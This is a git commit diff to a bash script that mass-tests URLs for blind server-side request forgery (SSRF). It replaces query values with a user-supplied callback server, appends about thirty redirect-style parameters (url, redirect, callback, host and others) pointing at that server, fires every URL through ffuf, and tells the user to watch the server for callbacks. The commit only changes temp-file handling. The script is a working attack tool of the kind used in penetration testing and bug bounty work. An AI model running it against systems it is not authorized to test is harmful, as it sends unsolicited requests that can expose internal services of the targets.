b67f70ec83576f6e666523d3c36451074a8fdeb2
lemosnlmb <80685782+lemosnlmb@users.noreply.github.com>
2022-07-11 15:07:35 +0100

    Update blind-ssrf-params.sh

--- ssrf/blind-ssrf-params/blind-ssrf-params.sh
+++ ssrf/blind-ssrf-params/blind-ssrf-params.sh
@@ -8,7 +8,9 @@ NC='\033[0m'
 list=$1
 server=$2
 
-cat $list | grep "=" | qsreplace "$server" 2>/dev/null | sort -u > $list.tmp && mv $list.tmp $list
-sed -i "s|$|\&dest=$server\&redirect=$server\&uri=$server\&path=$server\&continue=$server\&url=$server\&window=$server\&next=$server\&data=$server\&reference=$server\&site=$server\&html=$server\&val=$server\&validate=$server\&domain=$server\&callback=$server\&return=$server\&page=$server\&feed=$server\&host=$server&\port=$server\&to=$server\&out=$server\&view=$server\&dir=$server\&show=$server\&navigation=$server\&open=$server|g" $list
+cat $list | grep "=" | qsreplace "$server" 2>/dev/null | sort -u > $list.tmp
+sed -i "s|$|\&dest=$server\&redirect=$server\&uri=$server\&path=$server\&continue=$server\&url=$server\&window=$server\&next=$server\&data=$server\&reference=$server\&site=$server\&html=$server\&val=$server\&validate=$server\&domain=$server\&callback=$server\&return=$server\&page=$server\&feed=$server\&host=$server&\port=$server\&to=$server\&out=$server\&view=$server\&dir=$server\&show=$server\&navigation=$server\&open=$server|g" $list.tmp
 echo -e "${RED}CHECK YOUR SERVER FOR POTENTIALS CALLBACKS!${NC}"
-ffuf -r -w $list -u FUZZ 2 > /dev/null
+ffuf -r -w $list.tmp -u FUZZ 2 > /dev/null
+
+rm -rf $list.tmp
